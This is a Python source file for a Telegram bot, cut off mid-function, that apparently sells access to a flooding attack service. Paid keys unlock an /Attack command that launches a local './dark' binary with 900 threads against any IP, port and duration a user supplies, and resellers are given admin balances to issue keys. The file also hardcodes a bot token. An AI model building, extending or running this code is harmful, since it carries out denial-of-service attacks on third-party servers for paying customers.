import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from typing import Dict, List, Optional
import sys
import os

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

KEY_PRICES = {
    'hour': 10,  # 10 Rs per hour
    'day': 80,   # 80 Rs per day
    'week': 500  # 500 Rs per week
}
ADMIN_IDS = [1289249999]
BOT_TOKEN = "7081405169:AAGxVEJ5qUQvXQ3oIc8DH96GBlLI85QkhQk"
thread_count = 900
packet_size = 9
ADMIN_FILE = 'admin_data.json'
last_attack_times = {}
COOLDOWN_MINUTES = 0

def check_cooldown(user_id: int) -> tuple[bool, int]:
    """
    Check if a user is in cooldown period
    Returns (bool, remaining_seconds)
    """
    if user_id not in last_attack_times:
        return False, 0
        
    last_attack = last_attack_times[user_id]
    current_time = datetime.now()
    time_diff = current_time - last_attack
    cooldown_seconds = COOLDOWN_MINUTES * 60
    
    if time_diff.total_seconds() < cooldown_seconds:
        remaining = cooldown_seconds - time_diff.total_seconds()
        return True, int(remaining)
    return False, 0

def update_last_attack_time(user_id: int):
    """Update the last attack time for a user"""
    last_attack_times[user_id] = datetime.now()


def load_admin_data():
    """Load admin data from file"""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    
def update_admin_balance(admin_id: str, amount: float) -> bool:
    """
    Update admin's balance after key generation
    Returns True if successful, False if insufficient balance
    """
    try:
        admin_data = load_admin_data()
        
        # Super admins have infinite balance
        if int(admin_id) in ADMIN_IDS:
            return True
            
        if str(admin_id) not in admin_data['admins']:
            return False
            
        current_balance = admin_data['admins'][str(admin_id)]['balance']
        
        if current_balance < amount:
            return False
            
        admin_data['admins'][str(admin_id)]['balance'] -= amount
        save_admin_data(admin_data)
        return True
        
    except Exception as e:
        logging.error(f"Error updating admin balance: {e}")
        return False
    
def save_admin_data(data):
    """Save admin data to file"""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False
    
def is_super_admin(user_id):
    """Check if user is a super admin"""
    return user_id in ADMIN_IDS

def get_admin_balance(user_id):
    """Get admin's balance"""
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on duration"""
    base_price = KEY_PRICES.get(time_unit.lower().rstrip('s'), 0)
    return base_price * amount

bot = telebot.TeleBot(BOT_TOKEN)

# Initialize other required variables
redeemed_keys = set()
loop = None

# File paths
# File paths with absolute directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')


keys = {}

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

def ensure_file_exists(filepath):
    """Ensure the file exists and create if it doesn't"""
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            if filepath.endswith('.txt'):
                f.write('[]')  # Initialize with empty array for users.txt
            else:
                f.write('{}')  # Initialize with empty object for other files

def load_users():
    """Load users from users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        with open(USERS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return []
            return json.loads(content)
    except json.JSONDecodeError:
        # If file is corrupted, backup and create new
        backup_file = f"{USERS_FILE}.backup"
        if os.path.exists(USERS_FILE):
            os.rename(USERS_FILE, backup_file)
        return []
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return []

def save_users(users):
    """Save users to users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        # Create temporary file
        temp_file = f"{USERS_FILE}.temp"
        with open(temp_file, 'w') as f:
            json.dump(users, f, indent=2)
        
        # Rename temp file to actual file
        os.replace(temp_file, USERS_FILE)
        return True
    except Exception as e:
        logging.error(f"Error saving users: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    """Check if user is either a super admin or regular admin"""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or user_id in ADMIN_IDS

def load_keys():
    """Load keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    keys = {}
    try:
        with open(KEYS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return {}
                
            # Parse each line as a separate JSON object
            for line in content.split('\n'):
                if line.strip():
                    key_data = json.loads(line)
                    # Each line should contain a single key-duration pair
                    for key, duration_str in key_data.items():
                        days, seconds = map(float, duration_str.split(','))
                        keys[key] = timedelta(days=days, seconds=seconds)
            return keys
                    
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
        return {}

def save_keys(keys: Dict[str, timedelta]):
    """Save keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    try:
        temp_file = f"{KEYS_FILE}.temp"
        with open(temp_file, 'w') as f:
            # Write each key-duration pair as a separate JSON object on a new line
            for key, duration in keys.items():
                duration_str = f"{duration.days},{duration.seconds}"
                json_line = json.dumps({key: duration_str})
                f.write(f"{json_line}\n")
        
        # Rename temp file to actual file
        os.replace(temp_file, KEYS_FILE)
        return True
        
    except Exception as e:
        logging.error(f"Error saving keys: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def check_user_expiry():
    """Periodically check and remove expired users"""
    while True:
        try:
            users = load_users()
            current_time = datetime.now()
            
            # Filter out expired users
            active_users = [
                user for user in users 
                if datetime.fromisoformat(user['valid_until']) > current_time
            ]
            
            # Only save if there are changes
            if len(active_users) != len(users):
                save_users(active_users)
                
        except Exception as e:
            logging.error(f"Error in check_user_expiry: {e}")
        
        time.sleep(300)  # Check every 5 minutes

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@bot.message_handler(commands=['thread'])
def set_thread_count(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can change thread settings
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_thread_command)

@bot.message_handler(commands=['packet'])
def set_packet_size(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can change packet size settings
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change packet size settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the packet size.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_packet_command)

def process_packet_command(message):
    global packet_size
    chat_id = message.chat.id

    try:
        new_packet_size = int(message.text)
        
        if new_packet_size <= 0:
            bot.send_message(chat_id, "*Packet size must be a positive number.*", parse_mode='Markdown')
            return

        packet_size = new_packet_size
        bot.send_message(chat_id, f"*Packet size set to {packet_size} for dark.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid packet size. Please enter a valid number.*", parse_mode='Markdown')

def process_thread_command(message):
    global thread_count
    chat_id = message.chat.id

    try:
        new_thread_count = int(message.text)
        
        if new_thread_count <= 0:
            bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
            return

        thread_count = new_thread_count
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for dark.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        # Update last attack time before starting the attack
        update_last_attack_time(user_id)

        # Construct command for dark binary with thread count and packet size
        command = f"./dark {target_ip} {target_port} {duration} {packet_size} {thread_count}"

        # Send initial attack message
        bot.send_message(chat_id, 
            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
            f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
            f"᚛ ᚛ @GOD_OFF_LSR ᚜ ᚜")

        # Create and run process without output
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        
        # Wait for process to complete
        await process.wait()

        # Send completion message
        bot.send_message(chat_id, 
            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")

    except Exception as e:
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check cooldown first, regardless of admin status
    in_cooldown, remaining = check_cooldown(user_id)
    if in_cooldown:
        minutes = remaining // 60
        seconds = remaining % 60
        bot.send_message(
            chat_id,
            f"*⏰ Cooldown in progress! Please wait {minutes}m {de}s before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # If user is admin, allow attack
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack command: {e}")
            return

    # For regular users, check if they have a valid key
    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚛ @GOD_OFF_LSR ᚜*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        user_id = message.from_user.id
        
        # Double-check cooldown when processing the attack
        in_cooldown, remaining = check_cooldown(user_id)
        if in_cooldown:
            minutes = remaining // 60
            seconds = remaining % 60
            bot.send_message(
                chat_id,
                f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
                parse_mode='Markdown'
            )
            return
            
        args = message.text.split()
        
        if len(args) != 3:
            bot.send_message(chat_id, "*गलत हुआ है। ट्राई अगेन 😼*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Create a new event loop for this thread if necessary
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        # Run the attack command with user_id
        loop.run_until_complete(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id))
        
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')


@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By ᚛ @GOD_OFF_LSR ᚜"  
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['addadmin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Only super admins can add new admins
    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
        return

    try:
        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
            return

        new_admin_id = args[1]
        try:
            balance = float(args[2])
            if balance < 0:
                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
                return
        except ValueError:
            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
            return

        # Load current admin data
        admin_data = load_admin_data()

        # Add new admin with balance
        admin_data['admins'][new_admin_id] = {
            'balance': balance,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }

        # Save updated admin data
        if save_admin_data(admin_data):
            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
            
            # Try to notify the new admin
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*🎉 Congratulations! You have been promoted to admin!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "You now have access to admin commands:\n"
                    "/genkey - Generate new key\n"
                    "/remove - Remove user\n"
                    "/balance - Check your balance",
                    parse_mode='Markdown'
                )
            except:
                logger.warning(f"Could not send notification to new admin {new_admin_id}")
        else:
            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in add_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
def remove_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to remove admins.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "*Usage: /removeadmin <user_id>*", parse_mode='Markdown')
            return

        admin_to_remove = args[1]
        admin_data = load_admin_data()

        if admin_to_remove in admin_data['admins']:
            del admin_data['admins'][admin_to_remove]
            if save_admin_data(admin_data):
                bot.reply_to(message, f"*Successfully removed admin {admin_to_remove}*", parse_mode='Markdown')
                
                # Try to notify the removed admin
                try:
                    bot.send_message(
                        int(admin_to_remove),
                        "*Your admin privileges have been revoked.*",
      
